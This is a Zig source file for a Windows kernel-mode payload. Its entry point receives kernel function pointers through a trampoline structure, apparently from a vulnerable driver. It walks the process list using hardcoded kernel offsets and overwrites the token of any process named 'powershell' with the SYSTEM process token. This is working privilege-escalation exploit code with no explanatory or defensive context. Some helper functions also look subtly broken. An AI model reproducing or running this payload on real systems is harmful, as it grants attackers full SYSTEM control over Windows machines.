const UnicodeString = extern struct {
    Length: u16,
    MaximumLength: u16,
    Buffer: [*]u16,
};

pub const TrampData = extern struct {
        ex_allocate_pool_with_tag: u64, //SystemBuffer = ex_allocate
        memcpy: u64, //*(SystemBuffer + 8) = memcpy
        iof_complete_request: u64, //*(SystemBuffer + 0x10)
        mm_get_system_routine_address: u64, //*(SystemBuffer + 0x18)
        kernel_base: u64, //*(SystemBuffer + 0x20)
        payload: [0x1000]u8, //*(SystemBuffer + 0x28) payload
    };

const PsGetNextProcessOffset = 0x062bfa0;
const PsGetNextProcessOffset_real = 0x05f73c0;
const TokenOffset = 0x4B8;

const DbgPrintExFn = *const fn (ComponentId: u32, Level: u32, Format: [*:0]const u8, ...) callconv(.winapi) u32;
const PsGetNextProcessFn = *const fn (proc: ?*anyopaque) callconv(.winapi) u64;

fn initString(comptime s: []const u8, buf: []u8) [*:0]u8 {
    const p: *volatile [s.len + 1]u8 = @ptrCast(buf[0 .. s.len + 1]);

    inline for (s, 0..) |c, i| {
        p.*[i] = c;
    }

    p.*[s.len] = 0;

    return @ptrCast(buf.ptr);
}

export fn _start(tramp_data: *TrampData) callconv(.winapi) u64 {
    //asm volatile("int3");

    const ps_get_next_process_address = @addWithOverflow(tramp_data.kernel_base, PsGetNextProcessOffset_real).@"0";
    const ps_get_next_process: PsGetNextProcessFn = @ptrFromInt(ps_get_next_process_address);
    var p = ps_get_next_process(null);

    var system_token: u64 = 0;
    while (p != 0) {
        const image_file_name: *const [15]u8 = @ptrFromInt(p + 0x5a8);
        const token_ptr: *volatile u64 = @ptrFromInt(p + TokenOffset);
        if (image_file_name[0] == 'S' and image_file_name[1] == 'y' and image_file_name[2] == 's' and image_file_name[3] == 't') {
            system_token = token_ptr.*;
        }
        if (image_file_name[0] == 'p' and image_file_name[1] == 'o' and image_file_name[2] == 'w' and image_file_name[3] == 'e' and image_file_name[4] == 'r' and image_file_name[5] == 's') {
            if (system_token != 0)
            {
                token_ptr.* = system_token;
            }
        }

        p = ps_get_next_process(@ptrFromInt(p));
    }
    return 0;
}

inline fn create_ascii_string(comptime str: []const u8) []const u8 {
    var buf: [str.len]u8 = undefined;
    const p: *volatile [str]u8 = @ptrCast(&buf);

    inline for (0..buf.len - 1) |i| {
        p.*[i] = str[i];
    }
    return buf;
}

inline fn create_unicode_string(comptime str: []const u16) UnicodeString {
    var buf: [str.len + 1]u16 = undefined;
    const p: *volatile [str.len + 1]u16 = @ptrCast(&buf);

    inline for (0..buf.len - 1) |i| {
        p.*[i] = str[i];
    }

    return UnicodeString{
        .Length = str.len * 2,
        .MaximumLength = (str.len + 1) * 2,
        .Buffer = &buf,
    };
}
